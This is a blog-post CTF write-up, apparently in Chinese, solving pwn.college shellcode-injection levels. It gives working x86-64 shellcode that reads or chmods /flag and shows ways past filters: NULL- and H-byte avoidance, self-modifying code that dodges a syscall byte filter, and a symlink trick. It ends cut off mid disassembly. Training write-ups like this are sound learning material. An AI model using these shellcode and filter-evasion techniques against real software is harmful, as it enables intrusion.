<!DOCTYPE html><html lang="en"><head><meta http-equiv="content-type" content="text/html; charset=utf-8"><meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport"><meta content="yes" name="apple-mobile-web-app-capable"><meta content="black-translucent" name="apple-mobile-web-app-status-bar-style"><meta content="telephone=no" name="format-detection"><meta name="description" content=""><title>PwnCollege baby shell writeup | Hao's blog</title><link rel="stylesheet" type="text/css" href="/css/style.css?v=1.0.0"><link rel="stylesheet" type="text/css" href="//lib.baomitu.com/normalize/latest/normalize.min.css"><link rel="stylesheet" type="text/css" href="//lib.baomitu.com/pure/latest/pure-min.min.css"><link rel="stylesheet" type="text/css" href="//lib.baomitu.com/pure/latest/grids-responsive-min.min.css"><link rel="stylesheet" href="//lib.baomitu.com/font-awesome/4.7.0/css/font-awesome.min.css"><script type="text/javascript" src="//lib.baomitu.com/jquery/latest/jquery.min.js"></script><link rel="icon" mask="" sizes="any" href="/favicon.ico"><link rel="Shortcut Icon" type="image/x-icon" href="/favicon.ico"><link rel="apple-touch-icon" href="/apple-touch-icon.png"><link rel="apple-touch-icon-precomposed" href="/apple-touch-icon.png"><script type="text/javascript" src="//lib.baomitu.com/clipboard.js/latest/clipboard.min.js"></script><script type="text/javascript" src="//lib.baomitu.com/toastr.js/latest/toastr.min.js"></script><link rel="stylesheet" href="//lib.baomitu.com/toastr.js/latest/toastr.min.css"><meta name="generator" content="Hexo 6.3.0"></head><body><div class="body_container"><div id="header"><div class="site-name"><h1 class="hidden">PwnCollege baby shell writeup</h1><a id="logo" href="/.">Hao's blog</a><p class="description"></p></div><div id="nav-menu"><a class="current" href="/."><i class="fa fa-home"> Home</i></a><a href="/archives/"><i class="fa fa-archive"> Archive</i></a><a href="/about-me/"><i class="fa fa-user"> About</i></a><a href="/atom.xml"><i class="fa fa-rss"> RSS</i></a></div></div><div class="pure-g" id="layout"><div class="pure-u-1 pure-u-md-3-4"><div class="content_container"><div class="post"><h1 class="post-title">PwnCollege baby shell writeup</h1><div class="post-meta">2023-02-25<span> | </span><span class="category"><a href="/categories/CTF/">CTF</a></span></div><div class="post-content"><p>偶然间了解到了<a target="_blank" rel="noopener" href="https://pwn.college/">pwn.college</a>的存在, 有比较详细的PreReading和教程视频并且平台交互比较友好, 可以在网页中用vs code的terminal完成所有的操作, 比较方便, 于是就开始了CTF get start :). 我是从x86 assembly的那个module开始的, 因为是比较简单汇编语法, 这里就不赘述了, 就从shell injection开始吧.</p>
<p>shell injection的challenge在<code>/challenge/</code>目录下, 运行之后会显示当前level的challenge.</p>
<p>Tips:</p>
<ol>
<li>在shellcode中用<code>.intel_syntax noprefix</code> 可以代替gcc中的<code>-masm=intel</code></li>
<li>用<code>objcopy --dump-section .text=&lt;output&gt; &lt;excutable&gt;</code>dump出text section</li>
</ol>
<h2 id="level-1-2"><a href="#level-1-2" class="headerlink" title="level 1, 2"></a>level 1, 2</h2><p>level 1和level 2比较简单, 可以采用多种方式拿到flag. 可以读<code>/flag</code>文件, 然后输出到<code>/dev/stdout</code>. 或者直接调用<code>chmod</code>修改<code>/flag</code>文件的权限. 我这里用的是第一种方法.</p>
<p>第一个syscall是<code>open(&#39;/flag&#39;, 0, 0)</code>, 然后将fd作为第二个syscall<code>sendfile</code>的参数, 将<code>/flag</code>的内容发送给<code>/dev/stdout</code>, 也就是直接输出出来.</p>
<blockquote>
<p><em>This challenge will randomly skip up to 0x800 bytes in your shellcode</em></p>
</blockquote>
<p>level 2 与level 1不同的就是level 2会随机跳过最多0x800 bytes的code, 在最开始用<code>nop(0x90)</code>填充0x800 bytes即可.</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">.global</span> _start</span><br><span class="line"><span class="symbol">_start:</span></span><br><span class="line"><span class="meta">.intel_syntax</span> noprefix</span><br><span class="line"><span class="meta">.fill</span> <span class="number">0x800</span>, <span class="number">1</span>, <span class="number">0x90</span></span><br><span class="line">        <span class="keyword">mov</span> <span class="built_in">rax</span>, <span class="number">0x67616c662f</span></span><br><span class="line">        <span class="keyword">mov</span> [<span class="built_in">rdi</span>], <span class="built_in">rax</span></span><br><span class="line">        <span class="keyword">mov</span> <span class="built_in">rsi</span>, <span class="number">0</span></span><br><span class="line">        <span class="keyword">mov</span> <span class="built_in">rdx</span>, <span class="number">0</span></span><br><span class="line">        <span class="keyword">mov</span> <span class="built_in">rax</span>, <span class="number">2</span></span><br><span class="line">        <span class="keyword">syscall</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">mov</span> <span class="built_in">rdi</span>, <span class="number">1</span></span><br><span class="line">        <span class="keyword">mov</span> <span class="built_in">rsi</span>, <span class="built_in">rax</span></span><br><span class="line">        <span class="keyword">mov</span> <span class="built_in">rax</span>, <span class="number">40</span></span><br><span class="line">        <span class="keyword">mov</span> <span class="built_in">rdx</span>, <span class="number">0</span></span><br><span class="line">        <span class="keyword">mov</span> <span class="built_in">r10</span>, <span class="number">0x100</span></span><br><span class="line">        <span class="keyword">syscall</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">mov</span> <span class="built_in">rax</span>, <span class="number">60</span></span><br><span class="line">        <span class="keyword">mov</span> <span class="built_in">rdi</span>, <span class="number">0</span></span><br><span class="line">        <span class="keyword">syscall</span></span><br></pre></td></tr></table></figure>
<h2 id="level-3-4"><a href="#level-3-4" class="headerlink" title="level 3, 4"></a>level 3, 4</h2><blockquote>
<p><em>Level 3: This challenge requires that your shellcode have no NULL bytes!</em><br><em>Level 4: This challenge requires that your shellcode have no H bytes!</em></p>
</blockquote>
<p>level 3和level 4是同类型的, level 3要求编译好的shellcode里不能包含<code>NULL(0x00)</code>byte, level 4是要求不能包含 <code>H(0x48)</code>byte.<br>shellcode中包含0x00 byte大部分情况是因为操作数中含有至少1byte的0, 比如<code>mov rax, 0x123</code>, 编译后0x123会被填充成<code>0x00,00,00,00,00,00,01,23</code>. 如果要去除shellcode中的0x00, 可以对shellcode进行修改, 转换成等价的其他语句. 比如</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">mov</span> <span class="built_in">rax</span>, <span class="number">0</span> -&gt; <span class="keyword">xor</span> <span class="built_in">rax</span>, <span class="built_in">rax</span></span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">rax</span>, <span class="number">0x10</span> -&gt; <span class="keyword">mov</span> <span class="built_in">al</span>, <span class="number">0x10</span></span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">rax</span>, <span class="number">1</span> -&gt; <span class="keyword">inc</span> <span class="built_in">rax</span></span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<p>level 4的要求是不能包含<code>H(0x48)</code>byte, shellcode中出现H byte是因为x86_64为了兼容x86汇编添加的一个标识位, x86的shellcode一样可以在x86_64下运行, 所以只需要将shellcode中的64位寄存器换成32位寄存器就可以通过level 4了.<br>level 3 code:</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">.global</span> _start</span><br><span class="line"><span class="symbol">_start:</span></span><br><span class="line"><span class="meta">.intel_syntax</span> noprefix</span><br><span class="line">        <span class="keyword">xor</span> <span class="built_in">rax</span>, <span class="built_in">rax</span></span><br><span class="line">        <span class="keyword">mov</span> <span class="built_in">al</span>, <span class="number">0x67</span></span><br><span class="line">        <span class="keyword">shl</span> <span class="built_in">rax</span>, <span class="number">0x08</span></span><br><span class="line">        <span class="keyword">mov</span> <span class="built_in">al</span>, <span class="number">0x61</span></span><br><span class="line">        <span class="keyword">shl</span> <span class="built_in">rax</span>, <span class="number">0x08</span></span><br><span class="line">        <span class="keyword">mov</span> <span class="built_in">al</span>, <span class="number">0x6c</span></span><br><span class="line">        <span class="keyword">shl</span> <span class="built_in">rax</span>, <span class="number">0x08</span></span><br><span class="line">        <span class="keyword">mov</span> <span class="built_in">al</span>, <span class="number">0x66</span></span><br><span class="line">        <span class="keyword">shl</span> <span class="built_in">rax</span>, <span class="number">0x08</span></span><br><span class="line">        <span class="keyword">mov</span> <span class="built_in">al</span>, <span class="number">0x2f</span></span><br><span class="line">        <span class="keyword">mov</span> [<span class="built_in">rdi</span>], <span class="built_in">rax</span></span><br><span class="line">        <span class="keyword">xor</span> <span class="built_in">rsi</span>, <span class="built_in">rsi</span></span><br><span class="line">        <span class="keyword">xor</span> <span class="built_in">rdx</span>, <span class="built_in">rdx</span></span><br><span class="line">        <span class="keyword">xor</span> <span class="built_in">rax</span>, <span class="built_in">rax</span></span><br><span class="line">        <span class="keyword">inc</span> <span class="built_in">rax</span></span><br><span class="line">        <span class="keyword">inc</span> <span class="built_in">rax</span></span><br><span class="line">        <span class="keyword">syscall</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">xor</span> <span class="built_in">rdi</span>,<span class="built_in">rdi</span></span><br><span class="line">        <span class="keyword">inc</span> <span class="built_in">rdi</span></span><br><span class="line">        <span class="keyword">mov</span> <span class="built_in">rsi</span>, <span class="built_in">rax</span></span><br><span class="line">        <span class="keyword">xor</span> <span class="built_in">rax</span>, <span class="built_in">rax</span></span><br><span class="line">        <span class="keyword">mov</span> <span class="built_in">al</span>, <span class="number">40</span></span><br><span class="line">        <span class="keyword">xor</span> <span class="built_in">rdx</span>, <span class="built_in">rdx</span></span><br><span class="line">        <span class="keyword">xor</span> <span class="built_in">r10</span>, <span class="built_in">r10</span></span><br><span class="line">        <span class="keyword">inc</span> <span class="built_in">r10</span></span><br><span class="line">        <span class="keyword">shl</span> <span class="built_in">r10</span>, <span class="number">16</span></span><br><span class="line">        <span class="keyword">syscall</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">xor</span> <span class="built_in">rax</span>, <span class="built_in">rax</span></span><br><span class="line">        <span class="keyword">mov</span> <span class="built_in">al</span>, <span class="number">60</span></span><br><span class="line">        <span class="keyword">xor</span> <span class="built_in">rdi</span>, <span class="built_in">rdi</span></span><br><span class="line">        <span class="keyword">syscall</span></span><br></pre></td></tr></table></figure>
<p>level 4 code:</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">.global</span> _start</span><br><span class="line"><span class="symbol">_start:</span></span><br><span class="line"><span class="meta">.intel_syntax</span> noprefix</span><br><span class="line">        <span class="keyword">lea</span> <span class="built_in">eax</span>, [<span class="built_in">eip</span> + m]</span><br><span class="line">        <span class="keyword">mov</span> <span class="built_in">edi</span>, <span class="built_in">eax</span></span><br><span class="line">        <span class="keyword">mov</span> <span class="built_in">esi</span>, <span class="number">0</span></span><br><span class="line">        <span class="keyword">mov</span> <span class="built_in">edx</span>, <span class="number">0</span></span><br><span class="line">        <span class="keyword">mov</span> <span class="built_in">eax</span>, <span class="number">2</span></span><br><span class="line">        <span class="keyword">syscall</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">mov</span> <span class="built_in">edi</span>, <span class="number">1</span></span><br><span class="line">        <span class="keyword">mov</span> <span class="built_in">esi</span>, <span class="built_in">eax</span></span><br><span class="line">        <span class="keyword">mov</span> <span class="built_in">eax</span>, <span class="number">40</span></span><br><span class="line">        <span class="keyword">mov</span> <span class="built_in">edx</span>, <span class="number">0</span></span><br><span class="line">        <span class="keyword">mov</span> <span class="built_in">r10</span>, <span class="number">0x100</span></span><br><span class="line">        <span class="keyword">syscall</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">mov</span> <span class="built_in">eax</span>, <span class="number">60</span></span><br><span class="line">        <span class="keyword">mov</span> <span class="built_in">edi</span>, <span class="number">0</span></span><br><span class="line">        <span class="keyword">syscall</span></span><br><span class="line"><span class="symbol">m:</span></span><br><span class="line"><span class="meta">        .string</span> <span class="string">&quot;/flag&quot;</span></span><br></pre></td></tr></table></figure>

<h2 id="level-5-6"><a href="#level-5-6" class="headerlink" title="level 5, 6"></a>level 5, 6</h2><blockquote>
<p><em>This challenge requires that your shellcode does not have any <code>syscall</code>, <code>sysenter</code>, or <code>int</code> instructions. System calls are too dangerous! This filter works by scanning through the shellcode for the following byte sequences: 0f05 (<code>syscall</code>), 0f34 (<code>sysenter</code>), and 80cd (<code>int</code>). One way to evade this is to have your shellcode modify itself to insert the <code>syscall</code> instructions at runtime.</em></p>
</blockquote>
<p>level 5会过滤shellcode中的syscall, sysenter, int等命令阻止你调用API. 因为内存是可写的, 所以绕过这种过滤的办法就是通过<code>rip</code>计算出偏移, 然后对shellcode进行动态修改将下一条要执行的指令修改成<code>syscall</code>, <code>syscall</code>的op code是<code>0f05</code>, 我这里选择的是<code>clts</code>命令, 它的op code是<code>0f06</code>, 只要将第二个byte减一就可以将它变成<code>syscall</code>.</p>
<p>level 6的话是会移除shellcode前<code>4096(0x1000)</code>byte的写权限, 只要用nop填充一下就可以了.</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">.global</span> _start</span><br><span class="line"><span class="symbol">_start:</span></span><br><span class="line"><span class="meta">.intel_syntax</span> noprefix</span><br><span class="line">        <span class="keyword">mov</span> <span class="built_in">rax</span>, <span class="number">0x67616c662f</span></span><br><span class="line">        <span class="keyword">mov</span> [<span class="built_in">rdi</span>], <span class="built_in">rax</span></span><br><span class="line">        <span class="keyword">mov</span> <span class="built_in">rsi</span>, <span class="number">0</span></span><br><span class="line">        <span class="keyword">mov</span> <span class="built_in">rdx</span>, <span class="number">0</span></span><br><span class="line">        <span class="keyword">mov</span> <span class="built_in">rax</span>, <span class="number">2</span></span><br><span class="line">        <span class="keyword">dec</span> <span class="built_in">byte</span> <span class="built_in">ptr</span> [<span class="built_in">rip</span> + <span class="number">1</span>]</span><br><span class="line">        <span class="keyword">clts</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">mov</span> <span class="built_in">rdi</span>, <span class="number">1</span></span><br><span class="line">        <span class="keyword">mov</span> <span class="built_in">rsi</span>, <span class="built_in">rax</span></span><br><span class="line">        <span class="keyword">mov</span> <span class="built_in">rax</span>, <span class="number">40</span></span><br><span class="line">        <span class="keyword">mov</span> <span class="built_in">rdx</span>, <span class="number">0</span></span><br><span class="line">        <span class="keyword">mov</span> <span class="built_in">r10</span>, <span class="number">0x100</span></span><br><span class="line">        <span class="keyword">dec</span> <span class="built_in">byte</span> <span class="built_in">ptr</span> [<span class="built_in">rip</span> + <span class="number">1</span>]</span><br><span class="line">        <span class="keyword">clts</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">mov</span> <span class="built_in">rax</span>, <span class="number">60</span></span><br><span class="line">        <span class="keyword">mov</span> <span class="built_in">rdi</span>, <span class="number">0</span></span><br><span class="line">        <span class="keyword">dec</span> <span class="built_in">byte</span> <span class="built_in">ptr</span> [<span class="built_in">rip</span> + <span class="number">1</span>]</span><br><span class="line">        <span class="keyword">clts</span></span><br></pre></td></tr></table></figure>

<h2 id="level-7"><a href="#level-7" class="headerlink" title="level 7"></a>level 7</h2><p>level 7是将<code>/dev/stdin</code>, <code>/dev/stdout</code>, <code>/dev/stderr</code>都关闭了, 这样就无法通过标准输出获取flag, 不过仍然有好多种方式, 第一种是读<code>/flag</code>文件, 然后写到其他文件里去, 第二种就是直接call<code>chmod</code>, 修改<code>/flag</code>文件的权限.</p>
<p>我这里用的是第一种方式. 需要注意的是, <code>open</code>的CPP doc中的<code>flag</code>和<code>mode</code>参数都是八进制的, 不是十进制.</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">.global</span> _start</span><br><span class="line"><span class="symbol">_start:</span></span><br><span class="line"><span class="meta">.intel_syntax</span> noprefix</span><br><span class="line">        <span class="keyword">lea</span> <span class="built_in">eax</span>, [<span class="built_in">eip</span> + m]</span><br><span class="line">        <span class="keyword">mov</span> <span class="built_in">edi</span>, <span class="built_in">eax</span></span><br><span class="line">        <span class="keyword">mov</span> <span class="built_in">esi</span>, <span class="number">0</span></span><br><span class="line">        <span class="keyword">mov</span> <span class="built_in">edx</span>, <span class="number">0</span></span><br><span class="line">        <span class="keyword">mov</span> <span class="built_in">eax</span>, <span class="number">2</span></span><br><span class="line">        <span class="keyword">syscall</span></span><br><span class="line">        <span class="keyword">mov</span> <span class="built_in">ebx</span>, <span class="built_in">eax</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">lea</span> <span class="built_in">eax</span>, [<span class="built_in">eip</span> + o]</span><br><span class="line">        <span class="keyword">mov</span> <span class="built_in">edi</span>, <span class="built_in">eax</span></span><br><span class="line">        <span class="keyword">mov</span> <span class="built_in">esi</span>, <span class="number">65</span></span><br><span class="line">        <span class="keyword">mov</span> <span class="built_in">edx</span>, <span class="number">511</span></span><br><span class="line">        <span class="keyword">mov</span> <span class="built_in">eax</span>, <span class="number">2</span></span><br><span class="line">        <span class="keyword">syscall</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">mov</span> <span class="built_in">edi</span>, <span class="built_in">eax</span></span><br><span class="line">        <span class="keyword">mov</span> <span class="built_in">esi</span>, <span class="built_in">ebx</span></span><br><span class="line">        <span class="keyword">mov</span> <span class="built_in">eax</span>, <span class="number">40</span></span><br><span class="line">        <span class="keyword">mov</span> <span class="built_in">edx</span>, <span class="number">0</span></span><br><span class="line">        <span class="keyword">mov</span> <span class="built_in">r10</span>, <span class="number">0x100</span></span><br><span class="line">        <span class="keyword">syscall</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">mov</span> <span class="built_in">eax</span>, <span class="number">3</span></span><br><span class="line">        <span class="keyword">syscall</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">mov</span> <span class="built_in">eax</span>, <span class="number">60</span></span><br><span class="line">        <span class="keyword">mov</span> <span class="built_in">edi</span>, <span class="number">0</span></span><br><span class="line">        <span class="keyword">syscall</span></span><br><span class="line"><span class="symbol">m:</span></span><br><span class="line"><span class="meta">        .string</span> <span class="string">&quot;/flag&quot;</span></span><br><span class="line"><span class="symbol">o:</span></span><br><span class="line"><span class="meta">        .string</span> <span class="string">&quot;/home/hacker/key&quot;</span></span><br></pre></td></tr></table></figure>
<h2 id="level-8-13-14"><a href="#level-8-13-14" class="headerlink" title="level 8, 13, 14"></a>level 8, 13, 14</h2><blockquote>
<p><em>Reading 0x12 bytes from stdin</em><br><em>Reading 0xC bytes from stdin</em><br><em>Reading 0x6 bytes from stdin</em></p>
</blockquote>
<p>level 8, 13, 14这三个都是对shellcode的长度做了限制, 而且越来越短. 为了能让shellcode尽可能的短, 那我们就要减少syscall的数量, 同时保证用到的op code尽量的短.</p>
<p>这里我选择了调用<code>chmod</code>, 它只需要3个参数: <code>rax</code>syscall id, <code>rsi</code>保存指向filename的地址, <code>rdi</code>是要设置的权限. 但是文件名<code>/flag</code>需要5个byte, 再加上字符串结尾的<code>0x00</code>byte, 就占掉了6byte, 剩下的<code>mov si, 0x4; mov al, 0x5a; syscall</code>至少需要8byte, 看起来只能通过level 8 0x12byte的限制.</p>
<p>这里就需要用到一个chmod的一个feature, chmod不会改变symbolic links文件本身的权限, 而是改变它指向的文件的权限.</p>
<blockquote>
<p><em>chmod never changes the permissions of symbolic links; the chmod system call cannot change their permissions. This is not a problem since the permissions of symbolic links are never used. However, for each symbolic link listed on the command line, chmod changes the permissions of the pointed-to file. In contrast, chmod ignores symbolic links encountered during recursive directory traversals.</em></p>
</blockquote>
<p>利用这个特性, 就可以创建一个指向<code>/flag</code>文件的symbolic links, 它的名字长度就是可控的了. 我创建了一个叫<code>F</code>的链接文件来指向<code>/flag</code></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">ln</span> -s /flag F</span><br></pre></td></tr></table></figure>

<p>那文件名就是<code>0x46, 0x00</code>, 利用小端存储的特性, 只需要将<code>0x46</code>push到栈中即可, 它的高位会被自动填充成0. 同时<code>push 0x46</code>命令只占2bytes.</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">.global</span> _start</span><br><span class="line"><span class="symbol">_start:</span></span><br><span class="line"><span class="meta">.intel_syntax</span> noprefix</span><br><span class="line">        <span class="keyword">push</span> <span class="number">0x46</span></span><br><span class="line">        <span class="keyword">mov</span> <span class="built_in">rdi</span>, <span class="built_in">rsp</span></span><br><span class="line">        <span class="keyword">mov</span> <span class="built_in">si</span>,<span class="number">4</span></span><br><span class="line">        <span class="keyword">mov</span> <span class="built_in">al</span>, <span class="number">90</span></span><br><span class="line">        <span class="keyword">syscall</span></span><br></pre></td></tr></table></figure>

<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">0000000000401000</span> &lt;_start&gt;:</span><br><span class="line">  <span class="attribute">401000</span>:       <span class="number">6</span>a <span class="number">46</span>                   push   <span class="number">0</span>x46</span><br><span class="line">  <span class="attribute">401002</span>:       <span class="number">48</span> <span class="number">89</span> e7                mov    rdi,rsp</span><br><span class="line">  <span class="attribute">401005</span>:       <span class="number">66</span> be <span class="number">04</span> <span class="number">00</span>             mov    si,<span class="number">0</span>x4</span><br><span class="line">  <span class="attribute">401009</span>:       b0 <span class="number">5</span>a                   mov    al,<span class="number">0</span>x5a</span><br><span class="line">  <span class="attribute">40100b</span>:       <span class="number">0</span>f <span class="number">05</span>                   syscall </span><br></pre></td></tr></table></figure>
<p>但是这样编译出来的shellcode的长度是13, 只能通过level 8 和 level 13, 对于level 14的6byte看起来是个不可能的任务, 但level 14与前面两个level的不同就是level 14对于shellcode没有写权限的控制, 那么我们其实可以通过两段式来注入shellcode.</p>
<p>两段式注入第一段是调用<code>read</code>, 从<code>/dev/stdin</code>中读取第二段shellcode, 写入到<code>rip</code>指向的地址, 从而让第二段shellcode能够执行.</p>
<p>所以需要在第一段中调用<code>read</code> syscall, 其中<code>syscall(0f05)</code>占2byte, 只剩4byte留给其他的操作. 这里没有好的思路, 就gdb来调试下level 14的可执行文件.</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">0x0000558881446733</span> &lt;+<span class="number">460</span>&gt;:   mov    <span class="number">0</span>x28e6(%rip),%rax        # <span class="number">0</span>x558881449020 &lt;shellcode_mem&gt;</span><br><span class="line"><span class="attribute">0x000055888144673a</span> &lt;+<span class="number">467</span>&gt;:   mov    $<span class="number">0</span>x6,%edx</span><br><span class="line"><span class="attribute">0x000055888144673f</span> &lt;+<span class="number">472</span>&gt;:   mov    %rax,%rsi</span><br><span class="line"><span class="attribute">0x0000558881446742</span> &lt;+<span class="number">475</span>&gt;:   mov    $<span class="number">0</span>x0,%edi</span><br><span class="line"><span class="attribute">0x0000558881446747</span> &lt;+<span class="number">480</span>&gt;:   callq  <span class="number">0</span>x5588814461a0 &lt;read@plt&gt;</span><br><span class="line"><span class="attribute">0x000055888144674c</span> &lt;+<span class="number">485</span>&gt;:   mov    %rax,<span class="number">0</span>x28c5(%rip)        # <span class="number">0</span>x558881449018 &lt;shellcode_size&gt;</span><br><span class="line"><span class="attribute">0x0000558881446753</span> &lt;+<span class="number">492</span>&gt;:   mov    <span class="number">0</span>x28be(%rip),%rax        # <span class="number">0</span>x558881449018 &lt;shellcode_size&gt;</span><br><span class="line"><span class="attribute">0x000055888144675a</span> &lt;+<span class="number">499</span>&gt;:   test   %rax,%rax</span><br><span class="line"><span class="attribute">0x000055888144675d</span> &lt;+<span class="number">502</span>&gt;:   jne    <span class="number">0</span>x55888144677e &lt;main+<span class="number">535</span>&gt;</span><br><span class="line"><span class="attribute">0x000055888144675f</span> &lt;+<span class="number">504</span>&gt;:   lea    <span class="number">0</span>xd46(%rip),%rcx        # <span class="number">0</span>x5588814474ac &lt;__PRETTY_FUNCTION__.<span class="number">14866</span>&gt;</span><br><span class="line"><span class="attribute">0x0000558881446766</span> &lt;+<span class="number">511</span>&gt;:   mov    $<span class="number">0</span>x55,%edx</span><br><span class="line"><span class="attribute">0x000055888144676b</span> &lt;+<span class="number">516</span>&gt;:   lea    <span class="number">0</span>xa53(%rip),%rsi        # <span class="number">0</span>x5588814471c5</span><br><span class="line"><span class="attribute">0x0000558881446772</span> &lt;+<span class="number">523</span>&gt;:   lea    <span class="number">0</span>xcc6(%rip),%rdi        # <span class="number">0</span>x55888144743f</span><br><span class="line"><span class="attribute">0x0000558881446779</span> &lt;+<span class="number">530</span>&gt;:   callq  <span class="number">0</span>x558881446170 &lt;__assert_fail@plt&gt;</span><br><span class="line"><span class="attribute">0x000055888144677e</span> &lt;+<span class="number">535</span>&gt;:   lea    <span class="number">0</span>xcd3(%rip),%rdi        # <span class="number">0</span>x558881447458</span><br><span class="line"><span class="attribute">0x0000558881446785</span> &lt;+<span class="number">542</span>&gt;:   callq  <span class="number">0</span>x558881446120 &lt;puts@plt&gt;</span><br><span class="line"><span class="attribute">0x000055888144678a</span> &lt;+<span class="number">547</span>&gt;:   mov    <span class="number">0</span>x2887(%rip),%rdx        # <span class="number">0</span>x558881449018 &lt;shellcode_size&gt;</span><br><span class="line"><span class="attribute">0x0000558881446791</span> &lt;+<span class="number">554</span>&gt;:   mov    <span class="number">0</span>x2888(%rip),%rax        # <span class="number">0</span>x558881449020 &lt;shellcode_mem&gt;</span><br><span class="line"><span class="attribute">0x0000558881446798</span> &lt;+<span class="number">561</span>&gt;:   mov    %rdx,%rsi</span><br><span class="line"><span class="attribute">0x000055888144679b</span> &lt;+<span class="number">564</span>&gt;:   mov    %rax,%rdi</span><br><span class="line"><span class="attribute">0x000055888144679e</span> &lt;+<span class="number">567</span>&gt;:   callq  <span class="number">0</span>x5588814462c9 